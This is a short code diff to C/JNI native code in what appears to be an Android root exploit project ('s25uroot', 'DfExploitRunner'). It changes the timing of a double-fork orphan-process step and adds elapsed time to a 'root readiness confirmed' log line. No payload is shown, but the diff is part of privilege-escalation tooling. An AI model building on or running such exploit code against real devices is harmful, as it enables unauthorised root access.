@@ -21,6 +21,7 @@
 #include "aes256.h"
 #include "hmac_sha256.h"
 #include "ready_wait.h"
+#include "orphan_wait.h"
 #include <time.h>
 
 static jmethodID report_mid;
@@ -533,7 +534,7 @@ static int createOrphanProcess(struct Reporter *reporter) {
     if (pid < 0) { REPORTLN("fork failed: %s", strerror(errno)); return -1; }
     if (pid == 0) {
         int pid2 = fork();
-        if (pid2 == 0) { sleep(1); _exit(0); }
+        if (pid2 == 0) { df_wait_for_adopter(1); _exit(0); }
         _exit(0);
     }
     TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
@@ -632,7 +633,8 @@ Java_dev_busung_s25uroot_dirtyfrag_DfExploitRunner_nativeRunAll(JNIEnv *env, jcl
     // slow daemon retains the original window. Cleanup and final proof still run below.
     const struct df_ready_ops ready_ops = {ready_now, ready_sleep, ready_probe};
     struct df_ready_result waited = df_wait_ready(&ready_ops, reporter);
-    REPORTLN("* %s", waited.ready ? "root readiness confirmed" : "readiness window complete; verifying backend");
+    REPORTLN("* %s after %lld ms", waited.ready ? "root readiness confirmed" : "readiness window complete; verifying backend",
+             (long long)waited.elapsed_ms);
     for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
         if (has_marker(markers[j].path)) {
             REPORTLN("%s", markers[j].msg);
